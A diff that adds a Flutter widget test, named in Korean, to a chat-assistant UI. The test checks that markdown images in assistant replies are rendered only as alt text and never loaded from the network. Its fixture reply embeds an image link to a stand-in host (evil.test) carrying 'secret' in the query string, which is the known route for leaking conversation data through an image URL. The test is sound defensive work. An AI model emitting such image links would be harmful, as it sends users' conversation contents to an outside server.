@@ -68,6 +68,16 @@ void main() {
     expect(find.textContaining('플랫폼', findRichText: true), findsOneWidget);
   });
 
+  testWidgets('마크다운 이미지는 불러오지 않는다(외부 주소로 대화 내용이 새는 경로) — 대체 글만', (tester) async {
+    final brain = ChatBrain([say('요약 ![로고](https://evil.test/p?d=secret) 끝')]);
+    await tester.pumpWidget(host(brain, const AssistantSheet()));
+    await tester.enterText(find.byType(TextField), '요약');
+    await tester.tap(find.byTooltip('보내기'));
+    await tester.pumpAndSettle();
+    expect(find.byWidgetPredicate((w) => w is Image && w.image is NetworkImage), findsNothing);
+    expect(find.textContaining('[이미지: 로고]', findRichText: true), findsOneWidget);
+  });
+
   testWidgets('넓은 표는 넘치지 않고 가로로 밀어 본다', (tester) async {
     final row = List.filled(8, '아주 긴 칸 내용입니다').join(' | ');
     final brain = ChatBrain([say('| ${List.generate(8, (i) => '열$i').join(' | ')} |\n|${List.filled(8, '---').join('|')}|\n| $row |')]);
